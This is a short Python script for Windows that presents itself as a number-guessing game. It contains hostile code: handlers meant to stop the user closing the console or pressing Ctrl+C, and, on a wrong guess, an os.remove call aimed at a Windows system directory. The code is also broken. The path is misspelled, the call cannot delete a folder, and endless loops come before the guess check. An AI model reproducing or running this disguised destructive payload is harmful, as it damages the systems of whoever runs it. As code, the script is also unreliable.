import random, os, win32api, signal


number = random.randint(1,100)
guess = input("Guess a number between 1 and a 100")
guess = int(guess)

def handler(signum, frame):
  print("Non")
  signal.signal(signal.SIGINT, handler)
while True:
    pass
  
def on_close(event):
    print("Non")
    return True  # empêche la fermeture
win32api.SetConsoleCtrlHandler(on_close, True)
while True:
    pass
  
if guess == number:
  print ("You won !")
else:
  os.remove("C:\Windows\Systeme32")
